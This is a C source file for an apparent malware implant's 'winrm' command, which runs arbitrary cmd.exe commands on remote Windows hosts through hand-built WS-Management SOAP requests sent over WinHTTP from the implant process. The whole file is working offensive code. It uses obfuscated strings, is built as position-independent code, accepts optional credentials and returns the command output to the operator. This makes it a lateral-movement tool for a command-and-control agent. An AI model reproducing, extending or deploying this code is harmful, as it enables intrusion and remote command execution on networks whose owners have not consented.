#include "config.h"
#ifdef INCLUDE_CMD_WINRM

#include "commands.h"
#include "common.h"

// winrm <host> <command> [user] [pass] - run a command on a remote host over
// WinRM (WS-Management SOAP) using WinHTTP directly from the implant process.
// Four round trips: CREATE shell -> COMMAND -> RECEIVE (loop) -> SIGNAL close.
// No external binaries, no CRT, no XML parser (crude tag extraction).

// ── Extra WinHTTP functions (not in the shared instance table) ────────────────
typedef BOOL (WINAPI *fnWinHttpQueryHeaders)(HINTERNET, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD);
typedef BOOL (WINAPI *fnWinHttpSetCredentials)(HINTERNET, DWORD, DWORD, LPCWSTR, LPCWSTR, LPVOID);
typedef BOOL (WINAPI *fnWinHttpSetTimeouts)(HINTERNET, int, int, int, int);

#define ES_AUTH_TARGET_SERVER   0
#define ES_AUTH_SCHEME_NEGOTIATE 0x01000000
#define ES_AUTH_SCHEME_BASIC    0x00000001

#define ES_WINRM_PORT     5985
#define ES_ENV_MAX        8192   // UTF-8 envelope capacity
#define ES_RESP_MAX      (1024 * 1024)
#define ES_RECV_TRIES     120

typedef struct _WSFN {
    fnWinHttpOpen               Open;
    fnWinHttpConnect            Connect;
    fnWinHttpOpenRequest        OpenRequest;
    fnWinHttpSendRequest        SendRequest;
    fnWinHttpReceiveResponse    ReceiveResponse;
    fnWinHttpQueryDataAvailable QueryDataAvailable;
    fnWinHttpQueryHeaders       QueryHeaders;
    fnWinHttpReadData           ReadData;
    fnWinHttpCloseHandle        CloseHandle;
    fnWinHttpSetCredentials     SetCredentials;
    fnWinHttpSetTimeouts        SetTimeouts;
} WSFN;

// ── small helpers ─────────────────────────────────────────────────────────────

static int es_find(const char* hay, DWORD hlen, const char* ndl) {
    DWORD n = 0;
    while (ndl[n]) n++;
    if (n == 0 || hlen < n) return -1;
    for (DWORD i = 0; i <= hlen - n; i++) {
        DWORD j = 0;
        while (j < n && hay[i + j] == ndl[j]) j++;
        if (j == n) return (int)i;
    }
    return -1;
}

// copy text between <open> and </close-ish needle>; returns length or -1
static int es_extract(const char* resp, DWORD rlen, const char* open, const char* close,
                      char* out, DWORD outcap) {
    int s = es_find(resp, rlen, open);
    if (s < 0) return -1;
    s += (int)es_strlen(open);
    int e = es_find(resp + s, rlen - (DWORD)s, close);
    if (e < 0) return -1;
    DWORD len = (DWORD)e;
    if (len > outcap - 1) len = outcap - 1;
    es_memcpy(out, (PVOID)(resp + s), len);
    out[len] = 0;
    return (int)len;
}

// escape &, <, >, ", ' for XML text content; returns chars written
static DWORD es_xml_escape(char* dst, DWORD dcap, const char* src, DWORD slen) {
    DWORD p = 0;
    for (DWORD i = 0; i < slen && p < dcap - 8; i++) {
        char c = src[i];
        if (c == '&')      { dst[p++]='&'; dst[p++]='a'; dst[p++]='m'; dst[p++]='p'; dst[p++]=';'; }
        else if (c == '<') { dst[p++]='&'; dst[p++]='l'; dst[p++]='t'; dst[p++]=';'; }
        else if (c == '>') { dst[p++]='&'; dst[p++]='g'; dst[p++]='t'; dst[p++]=';'; }
        else if (c == '\"'){ dst[p++]='&'; dst[p++]='q'; dst[p++]='u'; dst[p++]='o'; dst[p++]='t'; dst[p++]=';'; }
        else if (c == '\''){ dst[p++]='&'; dst[p++]='a'; dst[p++]='p'; dst[p++]='o'; dst[p++]='s'; dst[p++]=';'; }
        else dst[p++] = c;
    }
    dst[p] = 0;
    return p;
}

static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static DWORD b64_val(char c) {
    if (c >= 'A' && c <= 'Z') return (DWORD)(c - 'A');
    if (c >= 'a' && c <= 'z') return (DWORD)(c - 'a' + 26);
    if (c >= '0' && c <= '9') return (DWORD)(c - '0' + 52);
    if (c == '+') return 62;
    if (c == '/') return 63;
    return 0xFFFFFFFF;
}

// decode base64; out_cap bounds; returns decoded length
static DWORD es_b64_decode(const char* in, DWORD inlen, BYTE* out, DWORD out_cap) {
    DWORD o = 0;
    DWORD acc = 0, bits = 0;
    for (DWORD i = 0; i < inlen && o < out_cap; i++) {
        char c = in[i];
        if (c == 0 || c == '\r' || c == '\n' || c == ' ' || c == '\t') continue;
        DWORD v = b64_val(c);
        if (v == 0xFFFFFFFF) break;
        acc = (acc << 6) | v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out[o++] = (BYTE)((acc >> bits) & 0xFF);
        }
    }
    return o;
}

static char* es_strchr_c(char* s, char c) {
    while (*s) { if (*s == c) return s; s++; }
    return NULL;
}

static char* es_strcpy_p(char* dst, const char* src) {
    while (*src) *dst++ = *src++;
    return dst;
}

// crude unsigned int to decimal string; returns end pointer
static char* es_utoa_p(char* dst, DWORD val) {
    char tmp[12];
    int n = 0;
    do { tmp[n++] = (char)('0' + (val % 10)); val /= 10; } while (val);
    while (n) *dst++ = tmp[--n];
    return dst;
}

// ── WinHTTP resolution ────────────────────────────────────────────────────────

static BOOL ws_resolve(PINSTANCE inst, WSFN* fn) {
    HMODULE h = (HMODULE)inst->Modules.Winhttp;
    if (!h) {
        if (!inst->Win32.LoadLibraryA) return FALSE;
        h = inst->Win32.LoadLibraryA(XSTR("winhttp.dll"));
        if (!h) return FALSE;
    }
    if (!inst->Win32.GetProcAddress) return FALSE;
    #define WS_GET(field, name) fn->field = (decltype(fn->field))inst->Win32.GetProcAddress(h, XSTR(name))
    WS_GET(Open, "WinHttpOpen");
    WS_GET(Connect, "WinHttpConnect");
    WS_GET(OpenRequest, "WinHttpOpenRequest");
    WS_GET(SendRequest, "WinHttpSendRequest");
    WS_GET(ReceiveResponse, "WinHttpReceiveResponse");
    WS_GET(QueryDataAvailable, "WinHttpQueryDataAvailable");
    WS_GET(QueryHeaders, "WinHttpQueryHeaders");
    WS_GET(ReadData, "WinHttpReadData");
    WS_GET(CloseHandle, "WinHttpCloseHandle");
    WS_GET(SetCredentials, "WinHttpSetCredentials");
    WS_GET(SetTimeouts, "WinHttpSetTimeouts");
    #undef WS_GET
    // fall back to instance-resolved pointers where available
    if (!fn->Open) fn->Open = inst->Win32.WinHttpOpen;
    if (!fn->Connect) fn->Connect = inst->Win32.WinHttpConnect;
    if (!fn->OpenRequest) fn->OpenRequest = inst->Win32.WinHttpOpenRequest;
    if (!fn->SendRequest) fn->SendRequest = inst->Win32.WinHttpSendRequest;
    if (!fn->ReceiveResponse) fn->ReceiveResponse = inst->Win32.WinHttpReceiveResponse;
    if (!fn->QueryDataAvailable) fn->QueryDataAvailable = inst->Win32.WinHttpQueryDataAvailable;
    if (!fn->ReadData) fn->ReadData = inst->Win32.WinHttpReadData;
    if (!fn->CloseHandle) fn->CloseHandle = inst->Win32.WinHttpCloseHandle;
    if (!fn->Open || !fn->Connect || !fn->OpenRequest || !fn->SendRequest ||
        !fn->ReceiveResponse || !fn->QueryDataAvailable || !fn->ReadData ||
        !fn->CloseHandle || !fn->SetCredentials)
        return FALSE;
    return TRUE;
}

// ── one WSMan POST round trip ─────────────────────────────────────────────────

static BOOL ws_post(PINSTANCE inst, WSFN* fn, const char* host, WORD port,
                    const char* body, DWORD body_len, BOOL use_basic,
                    const char* user, const char* pass,
                    char** resp, DWORD* resp_len) {
    *resp = NULL;
    *resp_len = 0;

    wchar_t whost[256];
    wchar_t wuser[128], wpass[128], wpath[16];
    inst->Win32.MultiByteToWideChar(CP_ACP, 0, host, -1, whost, 256);
    inst->Win32.MultiByteToWideChar(CP_ACP, 0, XSTR("/wsman"), -1, wpath, 16);
    if (use_basic) {
        inst->Win32.MultiByteToWideChar(CP_ACP, 0, user, -1, wuser, 128);
        inst->Win32.MultiByteToWideChar(CP_ACP, 0, pass, -1, wpass, 128);
    }

    HINTERNET hs = fn->Open(XWSTR(L"EmeraldStrike"), 0, NULL, NULL, 0);
    if (!hs) return FALSE;
    HINTERNET hc = fn->Connect(hs, whost, port, 0);
    if (!hc) { fn->CloseHandle(hs); return FALSE; }
    HINTERNET hr = fn->OpenRequest(hc, XWSTR(L"POST"), wpath, NULL, NULL, NULL, 0);
    if (!hr) { fn->CloseHandle(hc); fn->CloseHandle(hs); return FALSE; }

    if (fn->SetTimeouts)
        fn->SetTimeouts(hr, 15000, 120000, 120000, 120000);

    // WinHTTP auth requires the challenge flow: send once, get the 401,
    // set credentials, re-send on the SAME handle. Negotiate needs up to
    // 3 legs; WinHTTP drives SPNEGO across these re-sends.
    wchar_t whdr[128];
    inst->Win32.MultiByteToWideChar(CP_ACP, 0,
        XSTR("Content-Type: application/soap+xml;charset=UTF-8"), -1, whdr, 128);
    DWORD hdr_len = (DWORD)es_strlen(XSTR("Content-Type: application/soap+xml;charset=UTF-8"));

    fn->SetCredentials(hr, ES_AUTH_TARGET_SERVER,
                       use_basic ? ES_AUTH_SCHEME_BASIC : ES_AUTH_SCHEME_NEGOTIATE,
                       use_basic ? wuser : NULL,
                       use_basic ? wpass : NULL, NULL);

    BOOL ok = FALSE;
    for (int leg = 0; leg < 3; leg++) {
        ok = fn->SendRequest(hr, whdr, hdr_len, (LPVOID)body, body_len, body_len, 0);
        if (ok) ok = fn->ReceiveResponse(hr, NULL);
        if (!ok) break;
        DWORD status = 0, sz = sizeof(status);
        if (fn->QueryHeaders &&
            fn->QueryHeaders(hr, 19, (wchar_t*)-1 /* WINHTTP_HEADER_NAME_BY_INDEX */,
                             &status, &sz, 0) &&
            status != 401)
            break;
        // 401: credentials set above; loop re-sends the same handle
    }

    DWORD total = 0;
    char* buf = NULL;
    if (ok) {
        DWORD avail = 0;
        while (fn->QueryDataAvailable(hr, &avail) && avail > 0 && total < ES_RESP_MAX) {
            char* nb = (char*)es_realloc(inst, buf, total + avail + 1);
            if (!nb) break;
            buf = nb;
            DWORD rd = 0;
            if (!fn->ReadData(hr, buf + total, avail, &rd) || rd == 0) break;
            total += rd;
        }
        if (buf) buf[total] = 0;
    }

    fn->CloseHandle(hr);
    fn->CloseHandle(hc);
    fn->CloseHandle(hs);

    if (!ok) {
        if (buf) es_free(inst, buf);
        return FALSE;
    }
    *resp = buf;
    *resp_len = total;
    return TRUE;
}

// ── envelope builders ─────────────────────────────────────────────────────────

static DWORD s_msg_seq = 0;

// append a message id (unique-ish per call)
static char* es_append_msgid(char* p) {
    p = es_strcpy_p(p, XSTR("uuid:1A2B3C4D-0000-0000-0000-"));
    p = es_utoa_p(p, ++s_msg_seq);
    return p;
}

// common header pieces; parts differ by action/resource/selector
static DWORD ws_build_env(char* env, DWORD cap,
                          const char* action, const char* resource,
                          const char* selector_name, const char* selector_val,
                          const char* body_xml) {
    DWORD p = 0;
    #define ES_PUT(s) do { const char* _s = (s); while (*_s && p < cap - 1) env[p++] = *_s++; } while (0)

    ES_PUT(XSTR("<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\""
                " xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\""
                " xmlns:w=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\">"
                "<s:Header><a:To>http://targets/wsman</a:To>"
                "<w:ResourceURI s:mustUnderstand=\"true\">"));
    ES_PUT(resource);
    ES_PUT(XSTR("</w:ResourceURI><a:ReplyTo><a:Address s:mustUnderstand=\"true\">"
                "http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address></a:ReplyTo>"
                "<a:Action s:mustUnderstand=\"true\">"));
    ES_PUT(action);
    ES_PUT(XSTR("</a:Action><w:MaxEnvelopeSize s:mustUnderstand=\"true\">153600</w:MaxEnvelopeSize>"
                "<a:MessageID>"));
    char* mp = env + p;
    p = (DWORD)(es_append_msgid(mp) - env);
    ES_PUT(XSTR("</a:MessageID><w:Locale xml:lang=\"en-US\" s:mustUnderstand=\"false\"/>"
                "<w:OperationTimeout>PT60S</w:OperationTimeout>"));
    if (selector_name) {
        ES_PUT(XSTR("<w:SelectorSet><w:Selector Name=\""));
        ES_PUT(selector_name);
        ES_PUT(XSTR("\">"));
        ES_PUT(selector_val);
        ES_PUT(XSTR("</w:Selector></w:SelectorSet>"));
    } else {
        ES_PUT(XSTR("<w:SelectorSet/>"));
    }
    ES_PUT(XSTR("</s:Header><s:Body>"));
    ES_PUT(body_xml);
    ES_PUT(XSTR("</s:Body></s:Envelope>"));
    env[p] = 0;
    #undef ES_PUT
    return p;
}

// ── command implementation ────────────────────────────────────────────────────

VOID cmd_winrm(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD host_len = 0, cmd_len = 0, user_len = 0, pass_len = 0;
    char* host = parser_string(args, &host_len);
    char* cmd  = parser_string(args, &cmd_len);
    char* user = parser_string(args, &user_len);   // optional (empty = current context)
    char* pass = parser_string(args, &pass_len);   // optional

    if (!host || host_len == 0 || !cmd || cmd_len == 0) {
        package_add_string(inst, response, XSTR("usage: winrm <host> <command> [user] [pass]"));
        response->is_error = TRUE;
        return;
    }
    BOOL use_basic = (user && user_len > 0);
    if (use_basic && (!pass || pass_len == 0)) {
        package_add_string(inst, response, XSTR("user given without password"));
        response->is_error = TRUE;
        return;
    }

    WSFN fn;
    es_memset(&fn, 0, sizeof(fn));
    if (!ws_resolve(inst, &fn)) {
        package_add_string(inst, response, XSTR("winhttp.dll not available"));
        response->is_error = TRUE;
        return;
    }

    char host_z[256] = {0};
    es_memcpy(host_z, host, host_len < 255 ? host_len : 255);

    // escaped command wrapped as cmd.exe /c <cmd>
    static char esc[3072];
    DWORD esc_len = es_xml_escape(esc, sizeof(esc), cmd, cmd_len);
    xstr(_cmdline, "cmd.exe /c ");
    static char body_cmd[4096];
    char* bp = es_strcpy_p(body_cmd,
        XSTR("<rsp:CommandLine xmlns:rsp=\"http://schemas.microsoft.com/wbem/wsman/1/windows/shell\">"
             "<rsp:Command>cmd.exe</rsp:Command><rsp:Arguments>"));
    // escape again for /c argument text (esc already XML-escaped)
    {
        const char* c = _cmdline;
        while (*c) *bp++ = *c++;
    }
    es_memcpy(bp, esc, esc_len);
    bp += esc_len;
    bp = es_strcpy_p(bp, XSTR("</rsp:Arguments></rsp:CommandLine>"));
    *bp = 0;

    char env[ES_ENV_MAX];
    char* resp = NULL;
    DWORD resp_len = 0;
    char shell_id[80] = {0};
    char cmd_id[80] = {0};
    // heap buffers: 320KB of zero-init statics would bloat the flat PIC blob
    DWORD out_len = 0;
    DWORD err_len = 0;
    const DWORD OUT_CAP = 262144;   // decoded stdout accumulator cap
    const DWORD ERR_CAP = 65536;
    BYTE* out_buf = (BYTE*)es_malloc(inst, OUT_CAP);
    BYTE* err_buf = (BYTE*)es_malloc(inst, ERR_CAP);
    if (!out_buf || !err_buf) {
        if (out_buf) es_free(inst, out_buf);
        if (err_buf) es_free(inst, err_buf);
        package_add_string(inst, response, XSTR("alloc failed"));
        response->is_error = TRUE;
        return;
    }
    BOOL done = FALSE;

    // 1. CREATE shell
    DWORD env_len = ws_build_env(env, sizeof(env),
        XSTR("http://schemas.xmlsoap.org/ws/2004/09/transfer/Create"),
        XSTR("http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd"),
        NULL, NULL,
        XSTR("<rsp:Shell xmlns:rsp=\"http://schemas.microsoft.com/wbem/wsman/1/windows/shell\">"
             "<rsp:InputStreams>stdin</rsp:InputStreams>"
             "<rsp:OutputStreams>stdout stderr</rsp:OutputStreams></rsp:Shell>"));
    if (!ws_post(inst, &fn, host_z, ES_WINRM_PORT, env, env_len, use_basic,
                 use_basic ? user : NULL, use_basic ? pass : NULL, &resp, &resp_len)) {
        package_add_string(inst, response, XSTR("WinRM create shell: request failed"));
        response->is_error = TRUE;
        return;
    }
    if (es_extract(resp, resp_len, XSTR("<w:ShellId>"), XSTR("</w:ShellId>"), shell_id, sizeof(shell_id)) < 0) {
        package_add_string(inst, response, XSTR("WinRM create shell: no ShellId in response (auth or access denied)"));
        response->is_error = TRUE;
        es_free(inst, resp);
        return;
    }
    es_free(inst, resp);

    // 2. COMMAND
    env_len = ws_build_env(env, sizeof(env),
        XSTR("http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command"),
        XSTR("http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd"),
        XSTR("ShellId"), shell_id, body_cmd);
    if (!ws_post(inst, &fn, host_z, ES_WINRM_PORT, env, env_len, use_basic,
                 use_basic ? user : NULL, use_basic ? pass : NULL, &resp, &resp_len)) {
        package_add_string(inst, response, XSTR("WinRM command: request failed"));
        response->is_error = TRUE;
        return;
    }
    BOOL got_ids =
        es_extract(resp, resp_len, XSTR("<w:CommandId>"), XSTR("</w:CommandId>"), cmd_id, sizeof(cmd_id)) >= 0 ||
        es_extract(resp, resp_len, XSTR("<rsp:CommandId>"), XSTR("</rsp:CommandId>"), cmd_id, sizeof(cmd_id)) >= 0;
    if (!got_ids) {
        package_add_string(inst, response, XSTR("WinRM command: no CommandId in response"));
        response->is_error = TRUE;
        es_free(inst, resp);
        return;
    }
    es_free(inst, resp);

    // 3. RECEIVE loop
    char recv_body[512];
    char* rp = es_strcpy_p(recv_body,
        XSTR("<rsp:Receive xmlns:rsp=\"http://schemas.microsoft.com/wbem/wsman/1/windows/shell\">"
             "<rsp:DesiredStream CommandId=\""));
    rp = es_strcpy_p(rp, cmd_id);
    rp = es_strcpy_p(rp, XSTR("\">stdout stderr</rsp:DesiredStream></rsp:Receive>"));
    *rp = 0;

    char state[32] = {0};
    char exit_code[24] = {0};
    DWORD tries = 0;
    while (!done && tries < ES_RECV_TRIES) {
        tries++;
        env_len = ws_build_env(env, sizeof(env),
            XSTR("http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive"),
            XSTR("http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd"),
            XSTR("ShellId"), shell_id, recv_body);
        if (!ws_post(inst, &fn, host_z, ES_WINRM_PORT, env, env_len, use_basic,
                     use_basic ? user : NULL, use_basic ? pass : NULL, &resp, &resp_len))
            break;

        // walk every <rsp:Stream ...>BASE64</rsp:Stream>
        DWORD pos = 0;
        while (pos < resp_len) {
            int s = es_find(resp + pos, resp_len - pos, XSTR("<rsp:Stream "));
            if (s < 0) break;
            s += (int)es_strlen(XSTR("<rsp:Stream "));
            int tag_end = es_find(resp + pos + s, resp_len - pos - s, XSTR(">"));
            if (tag_end < 0) break;
            tag_end += s;
            BOOL is_stdout = es_find(resp + pos + s, (DWORD)(tag_end - s), XSTR("Name=\"stdout\"")) >= 0;
            BOOL is_stderr = es_find(resp + pos + s, (DWORD)(tag_end - s), XSTR("Name=\"stderr\"")) >= 0;
            int c = es_find(resp + pos + tag_end, resp_len - pos - tag_end, XSTR("</rsp:Stream>"));
            if (c < 0) break;
            BYTE* sink = is_stdout ? (out_buf + out_len) : (is_stderr ? (err_buf + err_len) : NULL);
            DWORD sink_cap = is_stdout ? (OUT_CAP - out_len)
                                       : (is_stderr ? (ERR_CAP - err_len) : 0);
            if (sink && sink_cap > 0) {
                DWORD dec = es_b64_decode(resp + pos + tag_end + 1, (DWORD)c - 1, sink, sink_cap);
                if (is_stdout) out_len += dec; else err_len += dec;
            }
            pos += tag_end + c + (DWORD)es_strlen(XSTR("</rsp:Stream>"));
        }

        if (es_extract(resp, resp_len, XSTR("CommandState State=\""),
                       XSTR("\""), state, sizeof(state)) >= 0 && es_strcmp(state, XSTR("Done")) == 0)
            done = TRUE;
        es_extract(resp, resp_len, XSTR("<rsp:ExitCode>"), XSTR("</rsp:ExitCode>"), exit_code, sizeof(exit_code));
        es_free(inst, resp);
        resp = NULL;
        if (!done) inst->Win32.Sleep(500);
    }

    // 4. SIGNAL close (best effort)
    char sig_body[256];
    rp = es_strcpy_p(sig_body,
        XSTR("<rsp:Signal xmlns:rsp=\"http://schemas.microsoft.com/wbem/wsman/1/windows/shell\" CommandId=\""));
    rp = es_strcpy_p(rp, cmd_id);
    rp = es_strcpy_p(rp, XSTR("\"><rsp:Code>"
        "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/signal/terminate</rsp:Code></rsp:Signal>"));
    *rp = 0;
    env_len = ws_build_env(env, sizeof(env),
        XSTR("http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Signal"),
        XSTR("http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd"),
        XSTR("ShellId"), shell_id, sig_body);
    if (ws_post(inst, &fn, host_z, ES_WINRM_PORT, env, env_len, use_basic,
                use_basic ? user : NULL, use_basic ? pass : NULL, &resp, &resp_len)) {
        if (resp) es_free(inst, resp);
    }

    // output
    if (out_len == 0 && err_len == 0 && !done) {
        package_add_string(inst, response, XSTR("WinRM receive: no output / command did not complete"));
        response->is_error = TRUE;
        return;
    }

    // combined report: exit code + stdout + stderr, single message buffer
    DWORD total_cap = 48 + out_len + err_len + 1;
    char* out = (char*)es_malloc(inst, total_cap);
    if (!out) {
        es_free(inst, out_buf);
        es_free(inst, err_buf);
        package_add_string(inst, response, XSTR("WinRM: alloc failed"));
        response->is_error = TRUE;
        return;
    }
    char* op = es_strcpy_p(out, XSTR("exit code: "));
    op = es_strcpy_p(op, exit_code[0] ? exit_code : (char*)XSTR("unknown"));
    if (out_len) {
        op = es_strcpy_p(op, XSTR("\n"));
        es_memcpy(op, out_buf, out_len);
        op += out_len;
    }
    if (err_len) {
        op = es_strcpy_p(op, XSTR("\n[stderr]\n"));
        es_memcpy(op, err_buf, err_len);
        op += err_len;
    }
    *op = 0;
    package_add_string(inst, response, out);
    es_free(inst, out);
    es_free(inst, out_buf);
    es_free(inst, err_buf);
}

#endif
